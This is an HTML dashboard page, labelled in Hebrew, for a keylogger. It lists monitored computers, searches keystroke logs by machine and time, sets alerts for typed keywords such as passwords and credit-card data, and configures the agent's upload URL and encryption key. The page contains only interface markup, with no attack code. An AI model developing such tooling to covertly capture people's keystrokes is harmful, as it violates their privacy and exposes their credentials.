<!DOCTYPE html>
<html lang="he" dir="rtl">

<head>
  <meta charset="UTF-8" />
  <title>KeyLogger Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="stylesheet" href="style.css?v=1" />
</head>

<body class="theme-modern">
  <header class="appbar" role="banner">
    <div class="appbar-inner container">
      <div class="brand" aria-label="כותרת היישום">
        <div class="logo" aria-hidden="true"></div>
        <h1>מרכז ניהול מחשבים</h1>
      </div>

      <nav class="topnav nav-links" aria-label="ניווט ראשי">
        <button class="tablink" data-page="home" aria-current="page">בית</button>
        <button class="tablink" data-page="logs">לוגים</button>
        <button class="tablink" data-page="alerts">ניהול התראות</button>
        <button class="tablink" data-page="agent">ניהול סוכן</button>
      </nav>

      <div id="agent-indicator" class="pill off"></div>
    </div>
  </header>

  <main class="container">
    <!-- HOME PAGE -->
    <section id="page-home" class="page section">
      <div class="section">
        <div class="section-title space-between">
          <h2>מחשבים זמינים</h2>
          <button class="btn" id="btn-refresh-machines">רענן</button>
        </div>
        <div id="machines-strip" class="machines-strip"></div>
        <div id="machines-status" class="status muted"></div>
      </div>
    </section>

    <!-- ALERTS PAGE -->
    <section id="page-alerts" class="page section hidden">
      <header class="header">
        <h1>ניהול התראות</h1>
        <p class="muted">צפה, צור ומחק התראות קיימות.</p>
      </header>

      <!-- טופס ליצירת התראה -->
      <form id="alert-form" class="alert-form">
        <div>
          <label>כותרת התראה</label>
          <input type="text" id="alert-title" placeholder="לדוגמה: הקלדת מילת מפתח" required />
        </div>
        <div>
          <label>מילות מפתח (מופרדות בפסיק)</label>
          <input type="text" id="alert-keywords" placeholder="סיסמה, אשראי, קוד" />
        </div>
        <button class="btn" type="submit">צור התראה</button>
      </form>

      <!-- רשימת התראות מהשרת -->
      <div style="display: flex; justify-content: space-between; flex-direction: row;">
        <div id="alerts-list" class="alerts-list"></div>
        <div id="warning-list" class="alerts-list"></div>
      </div>
    </section>

    <!-- LOGS PAGE -->
    <section id="page-logs" class="page section hidden">
      <header class="header">
        <h1>לוגים לפי מחשב</h1>
        <p class="muted">בחר מחשב, תאריך וטווח שעות.</p>
      </header>

      <div class="search-form" id="logs-search-form">
        <div>
          <label>מחשב</label>
          <select id="logs-machine"></select>
        </div>
        <div>
          <label>תאריך</label>
          <input type="date" id="logs-date" />
        </div>
        <div>
          <label>משעה</label>
          <input type="time" id="logs-start" step="60" />
        </div>
        <div>
          <label>עד שעה</label>
          <input type="time" id="logs-end" step="60" />
        </div>
        <div class="actions">
          <button class="btn" id="btn-fetch-logs">חפש</button>
        </div>
      </div>

      <div id="logs-results" class="logs-results"></div>
      <div id="logs-status" class="status muted"></div>
    </section>

    <!-- AGENT PAGE -->
    <section id="page-agent" class="page section hidden">
      <header class="header">
        <h1>ניהול הסוכן</h1>
        <p class="muted">הגדרות: <code>url</code>, <code>key_encryptor</code>, <code>wait_time</code>,
          <code>status_listen</code>.
        </p>
      </header>

      <div class="agent-grid">
        <div class="option-item">
          <label for="agent-url">url</label>
          <input id="agent-url" type="text" placeholder="http://127.0.0.1:5000/api/upload" />
          <button class="btn" id="btn-save-url">שמור</button>
        </div>

        <div class="option-item">
          <label for="agent-key">key_encryptor</label>
          <input id="agent-key" type="password" placeholder="******" />
          <button class="btn" id="btn-save-key">שמור</button>
        </div>

        <div class="option-item">
          <label for="agent-wait-sec">wait_time (שניות)</label>
          <input id="agent-wait-sec" type="number" min="0" step="1" placeholder="5" />
          <button class="btn" id="btn-save-wait">שמור</button>
        </div>

        <div class="option-item">
          <label>status_listen</label>
          <button class="btn btn-toggle" id="btn-toggle-agent" data-on="0">התחל האזנה</button>
        </div>
      </div>
    </section>
  </main>

  <div id="toast" class="toast hidden"></div>

  <script type="module" src="js/main.js"></script>
</body>

</html>
